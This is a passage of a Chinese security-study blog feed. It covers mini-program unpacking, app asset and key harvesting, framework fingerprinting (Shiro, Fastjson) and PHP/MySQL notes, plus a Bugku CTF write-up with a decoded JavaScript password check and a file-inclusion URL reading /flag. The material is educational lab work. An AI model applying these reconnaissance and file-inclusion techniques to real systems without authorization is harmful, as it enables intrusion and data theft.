        <content type="html"><![CDATA[<p>小程序</p><span id="more"></span><h1 id="小程序获取-各大平台-amp-关键字搜索"><a href="#小程序获取-各大平台-amp-关键字搜索" class="headerlink" title="小程序获取-各大平台&amp;关键字搜索"></a>小程序获取-各大平台&amp;关键字搜索</h1><ul><li>微信</li><li>百度</li><li>支付宝</li><li>抖音头条</li></ul><h1 id="小程序体验-凡科建站-amp-模版测试上线"><a href="#小程序体验-凡科建站-amp-模版测试上线" class="headerlink" title="小程序体验-凡科建站&amp;模版测试上线"></a>小程序体验-凡科建站&amp;模版测试上线</h1><p>测试：<a href="https://qz.fkw.com/">https://qz.fkw.com/</a><br>参考：<a href="https://blog.csdn.net/qq_52445443/article/details/122351865">https://blog.csdn.net/qq_52445443/article/details/122351865</a></p><p>微信小程序存储的路径：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\xxx\WeChat Files\Applet\</span><br><span class="line">在这个目录下的wx开始的文件夹，打开后按顺序选取wxapkg文件进行解包</span><br></pre></td></tr></table></figure><p>1.主体结构<br>小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。<br>一个小程序主体部分(即app)由三个文件组成，必须放在项目的根目录，如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">文件                 必需               作用    </span><br><span class="line">app.js               是            小程序逻辑</span><br><span class="line">app.json             是            小程序公共配置</span><br><span class="line">app.wxss             否            小程序公共样式表</span><br></pre></td></tr></table></figure><p>2.一个小程序页面由四个文件组成，分别是:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxx.js        页面逻辑(重点)★</span><br><span class="line">xxx.json      页面配置</span><br><span class="line">xxx.wxml      页面结构</span><br><span class="line">xxx.wxss      页面样式</span><br></pre></td></tr></table></figure><p>3.项目整体目录结构</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pages                页面文件夹★</span><br><span class="line">index                首页</span><br><span class="line">logs                 日志</span><br><span class="line">utils               </span><br><span class="line">util                 工具类(mina框架自动生成,你也可以建立一个：api)</span><br><span class="line">app.js               入口js(类似于java类中的main方法)、全局js</span><br><span class="line">app.json             全局配置文件</span><br><span class="line">app.wxss             全局样式文件</span><br><span class="line">project.config.json  跟你在详情中勾选的配置一样</span><br><span class="line">sitemap.json         用来配置小程序及其页面是否允许被微信索引</span><br></pre></td></tr></table></figure><h1 id="小程序抓包-Proxifier-amp-BurpSuite联动"><a href="#小程序抓包-Proxifier-amp-BurpSuite联动" class="headerlink" title="小程序抓包-Proxifier&amp;BurpSuite联动"></a>小程序抓包-Proxifier&amp;BurpSuite联动</h1><ul><li>对抓到的IP或域名进行Web安全测试</li><li>对抓到的IP或域名进行API安全测试</li><li>对抓到的IP或域名进行端口服务测试</li></ul><h1 id="小程序逆向-解包反编译-amp-动态调试-amp-架构"><a href="#小程序逆向-解包反编译-amp-动态调试-amp-架构" class="headerlink" title="小程序逆向-解包反编译&amp;动态调试&amp;架构"></a>小程序逆向-解包反编译&amp;动态调试&amp;架构</h1><p>对源码架构进行分析</p><ul><li><p>更多的资产信息</p></li><li><p>敏感的配置信息</p></li><li><p>未授权访问测试</p></li><li><p>源码中的安全问题</p></li><li><p>小程序多功能组手</p></li></ul><p>复杂操作：<a href="https://www.cnblogs.com/oodcloud/p/16964878.html">https://www.cnblogs.com/oodcloud/p/16964878.html</a><br>简单工具：<a href="http://xcx.siqingw.top/">http://xcx.siqingw.top/</a><br>-微信官方开发工具<br><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/stable.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0021</title>
      <link href="/2023/04/06/SEC-Study-0021/"/>
      <url>/2023/04/06/SEC-Study-0021/</url>
      
        <content type="html"><![CDATA[<p>APP资产</p><span id="more"></span><h1 id="案例1-2"><a href="#案例1-2" class="headerlink" title="案例1,2"></a>案例1,2</h1><h2 id="案例1：名称获取APP信息（爱企查-小蓝本-七麦-点点）"><a href="#案例1：名称获取APP信息（爱企查-小蓝本-七麦-点点）" class="headerlink" title="案例1：名称获取APP信息（爱企查/小蓝本/七麦/点点）"></a>案例1：名称获取APP信息（爱企查/小蓝本/七麦/点点）</h2><p>1、爱企查知识产权<br>2、七麦&amp;点点查名称</p><p><a href="https://www.xiaolanben.com/">小蓝本(免费)</a>–<a href="https://aiqicha.baidu.com/">爱企查</a>–<a href="https://www.qimai.cn/">七麦</a>–<a href="https://app.diandian.com/">点点(数据较全)</a></p><h2 id="案例2：URL网站备案查APP"><a href="#案例2：URL网站备案查APP" class="headerlink" title="案例2：URL网站备案查APP"></a>案例2：URL网站备案查APP</h2><p>1、查备案信息在搜<br>2、网站上有APP下载<br>3、市场直接搜单位名称</p><h1 id="获取敏感信息-amp-资产"><a href="#获取敏感信息-amp-资产" class="headerlink" title="获取敏感信息&amp;资产"></a>获取敏感信息&amp;资产</h1><p>通过获取App配置、数据包，去获取url、api、osskey、js等敏感信息。<br>1、资产信息-IP 域名 网站 -转到对应Web测试 接口测试 服务测试<br>2、泄露信息-配置key 资源文件 - key（osskey利用，邮件配置等）<br>3、代码信息-java代码安全问题 - 逆向相关</p><h2 id="APP中收集资产"><a href="#APP中收集资产" class="headerlink" title="APP中收集资产"></a>APP中收集资产</h2><p>1、抓包-动态表现<br>2、提取-静态表现&amp;动态调试<br>3、搜索-静态表现</p><h2 id="各方法优缺点"><a href="#各方法优缺点" class="headerlink" title="各方法优缺点"></a>各方法优缺点</h2><blockquote><p>1、抓包抓表现出来的数据<br>优点：没有误报<br>缺点：无法做到完整<br>状态：动态，点击登录时，有交互的动作</p></blockquote><blockquote><p>2、反编译从源码中提取数据<br>优点：数据较为完整<br>缺点：有很多无用的资产<br>状态：静态，没有做任何事情<br>注意：无法搜索出加密的网址。<br>平台原理：正则表达式的匹配搜索查询</p></blockquote><blockquote><p>3、动态调试从表现中提取数据(MobSF)<br>优点：没有误报，解决不能抓包不能代理等情况<br>优点；搞逆向的人能看到实时的app调用链等<br>缺点：无法做到完整–不点就不收集</p></blockquote><p>案例：某APP打开无数据包，登录有数据包（反编译后未找到目标资产，抓包住到了）<br>原因：那个登录界面是APP打包的资源，并没有对外发送数据。</p><h1 id="案例3"><a href="#案例3" class="headerlink" title="案例3"></a>案例3</h1><p>案例3：APP提取信息-静态分析<br>1、MobSF（破解逆向反编译）（动静态分析）– 告别抓包上抓不到的问题，调试的数据很全面。<br>2、AppInfoScanner<br>3、两个在线平台<br><a href="https://mogua.co/">mogua</a><br>平台静态分析：<a href="https://www.zhihuaspace.cn:8888/">zhihuaspace</a><br>工具：<br><a href="https://github.com/kelvinBen/AppInfoScanner">kelvinBen</a><br><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a><br>Windows - MobSF安装参考：<br><a href="https://www.cnblogs.com/B-hai/p/15696948.html">个人博客参考</a><br><a href="https://blog.csdn.net/ljh824144294/article/details/119181803">CSDN</a></p><p>案例3：APP提取信息-动态抓包</p><ul><li>前期部分抓包技术</li></ul><p>案例3：APP提取信息-动态调试</p><ul><li>MobSF+模拟器</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-006</title>
      <link href="/2023/04/06/CTF-web-006/"/>
      <url>/2023/04/06/CTF-web-006/</url>
      
        <content type="html"><![CDATA[<p>基础赛题<br>题库来源：bugku web</p><span id="more"></span><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><blockquote><p>十六进制编码的特征是使用16个字符（0-9和A-F）来表示数值，每个字符代表4个比特（bit）。在编码中，每个字符都用 “%” 符号后跟其对应的十六进制数字表示，多个字符之间使用 “%” 分隔。</p></blockquote><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>得题<br><img src="a1.jpg" alt="题目"><br><img src="a2.jpg" alt="对应网站"></p><p>根据题目的提示，尝试查看网页源代码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>BUGKUCTF-WEB13<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span><br><span class="line">看看源代码？<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> p1 = <span class="string">&#x27;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> p2 = <span class="string">&#x27;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(p1) + <span class="built_in">unescape</span>(<span class="string">&#x27;%35%34%61%61%32&#x27;</span> + p2));</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到要解码的代码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62%35%34%61%61%32%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b</span><br></pre></td></tr></table></figure><p>到在线工具网站使用<a href="https://tool.chinaz.com/tools/urlencode.aspx">URL解码</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkSubmit</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=<span class="keyword">typeof</span> a&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.<span class="property">value</span>)<span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">            a.<span class="title function_">focus</span>();<span class="keyword">return</span>!<span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;levelQuest&quot;</span>).<span class="property">onsubmit</span>=checkSubmit;</span><br></pre></td></tr></table></figure><p>得到关键字符串</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">67d709b2b54aa2aa648cf6e87a7114f1</span><br></pre></td></tr></table></figure><p>将字符串输入后，得到flag。<br><img src="a3.jpg" alt="flag"><br><img src="a4.jpg" alt="max"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>查看网页源代码，识别出对应字符串的编码格式。</li><li>识别编码后，使用对应的编码工具进行解码</li><li>URL编码的特征：%+16进制字符串</li></ol><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h2><p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">php伪协议</a>–</p><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="b1.jpg" alt="题目"><br>文件包含，点击a标签后会跳转到特定的链接，而链接当中携带了两个php的文件信息。</p><p><img src="b2.jpg" alt="跳转"><br>尝试构造文件包含的URL，把file直接指向flag试试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx:xxx/index.php?file=/flag</span><br></pre></td></tr></table></figure><p><img src="b5.jpg" alt="getflag"><br><img src="b8.jpg" alt="flag"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>题目的目的：</p><ul><li>告诉我们文件包含是什么</li><li>重点：必须学会Web经典十大漏洞<ul><li>懂理论有个鸟用，重点是实战。</li></ul></li><li>文件包含之<a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">PHP伪协议</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0020</title>
      <link href="/2023/04/05/SEC-Study-0020/"/>
      <url>/2023/04/05/SEC-Study-0020/</url>
      
        <content type="html"><![CDATA[<p>OA系统可以通过CMS识别到</p><h1 id="前后端-amp-框架-amp-组件"><a href="#前后端-amp-框架-amp-组件" class="headerlink" title="前后端&amp;框架&amp;组件"></a>前后端&amp;框架&amp;组件</h1><span id="more"></span><h2 id="后端-amp-前端"><a href="#后端-amp-前端" class="headerlink" title="后端&amp;前端"></a>后端&amp;前端</h2><p>CMS：一般PHP开发居多源码程序<br>（利用源码程序名去搜漏洞情况，源码去下载进行后期的代码审计）</p><p>js 框架（爬取更多的js从里面筛选URL或敏感泄漏key等）<br>也是可以通过对js代码逻辑进行代码审计</p><h2 id="框架-amp-组件"><a href="#框架-amp-组件" class="headerlink" title="框架&amp;组件"></a>框架&amp;组件</h2><p>框架：</p><ul><li>简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可</li><li>java居多，常见有过安全漏洞组件（shiro solr log4j sprintboot等）</li></ul><p>如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可<br>影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制</p><p>组件：第三方的功能模块（日志记录，数据监控，数据转换等）<br>php java python都有，但PHP和Python组件较少。<br>专门搞某一件事情。</p><h3 id="Web架构分类"><a href="#Web架构分类" class="headerlink" title="Web架构分类"></a>Web架构分类</h3><blockquote><p>1、最简单最入门的开发模型 - （功能代码全部手写）<br>安全角度：最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写</p></blockquote><blockquote><p>2、结合开发框架的开发模型 - （以框架为核心实现功能）<br>功能直接调用，只需要懂的如何使用即可。<br>安全角度：第三方或团队的开发的封装代码框架，一般内置的过滤机制（ <strong>框架漏洞</strong> ）</p></blockquote><blockquote><p>3、结合开发框架外加组件模型 - （以框架为核心，组件为辅实现功能）<br>安全角度：第三方或团队的开发的封装代码框架，一般内置的过滤机制（ <strong>框架和组件漏洞</strong> ）</p></blockquote><h3 id="指纹识别-本地工具-GotoScan（CMSEEK）"><a href="#指纹识别-本地工具-GotoScan（CMSEEK）" class="headerlink" title="指纹识别-本地工具-GotoScan（CMSEEK）"></a>指纹识别-本地工具-GotoScan（CMSEEK）</h3><p><a href="https://github.com/newbe3three/gotoscan">GotoScan</a>：针对内网环境进行CMS识别。</p><p>1、在线平台见前面课程，本地工具适用于不出网环境<br>2、网络空间：Fofa Quake Hunter<br>3、网络空间：IO图标关系</p><h1 id="Python-amp-PHP-amp-Java框架"><a href="#Python-amp-PHP-amp-Java框架" class="headerlink" title="Python&amp;PHP&amp;Java框架"></a>Python&amp;PHP&amp;Java框架</h1><p>Set-Cookie特征：使用的人多了，注意安全问题所产生的固定格式，如TOKEN。</p><p>插件不一定可以识别得出框架。</p><h2 id="Python-开发框架-Django-amp-Flask-CTF考过"><a href="#Python-开发框架-Django-amp-Flask-CTF考过" class="headerlink" title="Python-开发框架-Django&amp;Flask-(CTF考过)"></a>Python-开发框架-Django&amp;Flask-(CTF考过)</h2><p>漏洞扫描工具：<a href="http://vul.tidesec.com/">tidesec(要VIP)</a></p><p>Django<br>1、识别插件<br>2、Set-Cookie:expires=</p><p>Flask<br>1、识别插件<br>2、Set-Cookie:expires=</p><h2 id="PHP-开发框架-ThinkPHP-amp-Laravel-amp-Yii"><a href="#PHP-开发框架-ThinkPHP-amp-Laravel-amp-Yii" class="headerlink" title="PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii"></a>PHP-开发框架-ThinkPHP&amp;Laravel&amp;Yii</h2><p>ThinkPHP：<br>0、识别插件<br>1、X-Powered-By: ThinkPHP<br>2、CMS识别到源码体系TP开发</p><p>Laravel：<br>1、识别插件<br>2、Set-Cookie中特征的格式</p><p>Yii:<br>1、识别插件<br>2、Set-Cookie中特征的格式</p><h2 id="Java-框架组件-Fastjson-amp-Shiro-amp-Solr-amp-Spring"><a href="#Java-框架组件-Fastjson-amp-Shiro-amp-Solr-amp-Spring" class="headerlink" title="Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring"></a>Java-框架组件-Fastjson&amp;Shiro&amp;Solr&amp;Spring</h2><p>52类110个主流Java组件和框架<a href="https://blog.csdn.net/agonie201218/article/details/125300729">介绍</a></p><p>好几个爆过漏洞：Log4j2，Shiro，jjwt，Spring等。</p><h3 id="Fastjson-Jackson"><a href="#Fastjson-Jackson" class="headerlink" title="Fastjson/Jackson"></a>Fastjson/Jackson</h3><blockquote><p>在提交JSON数据包中修改测试：</p><ul><li>Fastjson组件会把01解析成1</li><li>Jackson组件在解析01时会抛出异常<br><a href="https://forum.butian.net/share/1679">浅谈黑盒识别Fastjson/Jackson组件</a><br><a href="https://www.iculture.cc/forum-post/24115.html">扫描器</a></li></ul></blockquote><h3 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h3><p>请求包的cookie中存在rememberMe字段。<br>返回包中存在set-Cookie：remeberMe=deleteMe。<br>请求包中存在rememberMe=x时，响应包中存在rememberMe=deleteMe。<br>有时候服务器不会主动返回remeberMe=deleteMe，直接发包即可，将Cookie内容改为remember Me=1，若相应包有rememberMe=deleteMe，则基本可以确定网站apache shiro搭建的。</p><h3 id="Struts2"><a href="#Struts2" class="headerlink" title="Struts2"></a>Struts2</h3><p>一般使用struts2框架后缀带do或action，可以尝试进行利用</p><h3 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h3><p>1、通过web应用程序网页标签的小绿叶图标<br>2、通过springboot框架默认报错页面</p><h3 id="Solr识别"><a href="#Solr识别" class="headerlink" title="Solr识别"></a>Solr识别</h3><p>一般开放8983端口,访问页面也可以探针到</p><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h1><p>漏洞分析复现平台：<a href="https://vulfocus.cn/#/dashboard">vulfocus</a><br>docker拉取：<a href="https://hub.docker.com/">docker</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-017-数据库-04</title>
      <link href="/2023/04/05/PHP-Study-017/"/>
      <url>/2023/04/05/PHP-Study-017/</url>
      
        <content type="html"><![CDATA[<p>数据库相关的表操作，准备做大项目。</p><span id="more"></span><h1 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    gender <span class="type">VARCHAR</span>(<span class="number">10</span>),</span><br><span class="line">    birthdate <span class="type">DATE</span>,</span><br><span class="line">    age <span class="type">INT</span>,</span><br><span class="line">    school <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    phone <span class="type">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">    education <span class="type">VARCHAR</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">d：自增长的主键列</span><br><span class="line">username：用户名</span><br><span class="line">gender：性别</span><br><span class="line">birthdate：出生日期</span><br><span class="line">age：年龄</span><br><span class="line">school：学校</span><br><span class="line">phone：电话号码</span><br><span class="line">education：学历</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">用户名，电话号码，邮箱，密码</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users &#123;</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY</span> KEY;</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    phone <span class="type">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>),</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="表连接"><a href="#表连接" class="headerlink" title="表连接"></a>表连接</h1><p>表联立，连接俩数据表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL中的表连接分为以下几种：</span><br><span class="line"></span><br><span class="line">    内连接（<span class="keyword">Inner</span> <span class="keyword">Join</span>）：返回两个表中的匹配行，只有在两个表中都存在匹配时才返回数据。(两者都存在)</span><br><span class="line">        <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1,table2 <span class="keyword">where</span> table1.id<span class="operator">=</span>table2.id;</span><br><span class="line"></span><br><span class="line">    外连接（<span class="keyword">Outer</span> <span class="keyword">Join</span>）：左外连接（<span class="keyword">Left</span> <span class="keyword">Outer</span> <span class="keyword">Join</span>）和右外连接（<span class="keyword">Right</span> <span class="keyword">Outer</span> <span class="keyword">Join</span>），其中左外连接返回左表中所有行以及右表中匹配的行，而右外连接则返回右表中所有行以及左表中匹配的行。</span><br><span class="line">        左外连接: </span><br><span class="line">            以左表为准，右表没有符合左表的数据则返回<span class="keyword">NULL</span></span><br><span class="line">            简单理解：左表显示全部，右表仅显示匹配项。</span><br><span class="line"></span><br><span class="line">            <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.id<span class="operator">=</span>table2.id;</span><br><span class="line"></span><br><span class="line">    自连接（Self <span class="keyword">Join</span>）：在同一张表中进行连接，可以将一张表看作两张表。</span><br><span class="line"></span><br><span class="line">    交叉连接（<span class="keyword">Cross</span> <span class="keyword">Join</span>）：返回两个表中所有可能的组合，也称为笛卡尔积。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>举例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name <span class="operator">=</span> table2.column_name</span><br><span class="line"><span class="keyword">JOIN</span> table3</span><br><span class="line"><span class="keyword">ON</span> table2.column_name <span class="operator">=</span> table3.column_name;</span><br><span class="line"></span><br><span class="line">column_name(s):         要查询的字段</span><br><span class="line">table1,table2,table3:   数据表<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span></span><br><span class="line">table1.column_name，</span><br><span class="line">table2.column_name，</span><br><span class="line">table3.column_name:     用来将数据库表两两互相连接的语句，前提是两数据表有相同的字段。</span><br></pre></td></tr></table></figure><h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>借用第二表，对第二表进行筛选</span><br><span class="line">    两表的列：</span><br><span class="line">    table1 : id,username,sal</span><br><span class="line">    table2 : id,age,home_addr</span><br><span class="line"></span><br><span class="line">    查询语句：</span><br><span class="line">    <span class="keyword">SELECT</span>  table1.username <span class="keyword">as</span> name,table2.age <span class="keyword">as</span> age <span class="keyword">FROM</span> table1 <span class="keyword">join</span> (</span><br><span class="line">        <span class="keyword">SELECT</span> id,age <span class="keyword">FROM</span> table2</span><br><span class="line">    ) <span class="keyword">as</span> table3 <span class="keyword">on</span> table1.id<span class="operator">=</span>table3.id;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>子查询关键字</span><br><span class="line">    <span class="keyword">in</span> , ont <span class="keyword">in</span> , <span class="keyword">exists</span> , <span class="keyword">not</span> <span class="keyword">exists</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">exists</span>(<span class="keyword">select</span> 语句)</span><br><span class="line">        <span class="keyword">EXISTS</span>：如果子查询返回任何行，则返回真值。</span><br><span class="line">            存在记录：<span class="literal">true</span> （包括<span class="keyword">null</span>）</span><br><span class="line">            不存在录：<span class="literal">false</span> <span class="operator">=</span><span class="operator">&gt;</span> 记录</span><br><span class="line">        <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>：如果子查询没有返回任何行，则返回真值</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exists</span>举例：</span><br><span class="line">        这个查询中，子查询从customers表中检索与当前订单相应的客户记录。如果客户存在，则主查询从orders表中返回相应的订单记录。如果不存在，则不返回。</span><br><span class="line">        <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">        <span class="keyword">FROM</span> orders o</span><br><span class="line">        <span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line">          <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">          <span class="keyword">FROM</span> customers c</span><br><span class="line">          <span class="keyword">WHERE</span> c.customer_id <span class="operator">=</span> o.customer_id</span><br><span class="line">        );</span><br></pre></td></tr></table></figure><h1 id="记录联合"><a href="#记录联合" class="headerlink" title="记录联合"></a>记录联合</h1><blockquote><p>UNION: 合并两个或多个 SELECT 语句的结果集时，删除重复的行。</p><blockquote><p>UNION 操作符只会选出不同的值，不会返回重复的值。</p></blockquote><p>UNION ALL: 合并两个或多个 SELECT 语句的结果集时，保留所有行，包括重复的行。</p><blockquote><p>UNION ALL 操作符会选出所有的值，包括重复的值。</p></blockquote></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> Name <span class="keyword">FROM</span> Table2;</span><br></pre></td></tr></table></figure><h1 id="MYSQL支持的数据类型"><a href="#MYSQL支持的数据类型" class="headerlink" title="MYSQL支持的数据类型"></a>MYSQL支持的数据类型</h1><figure class="highlight bash"><table><tr><td 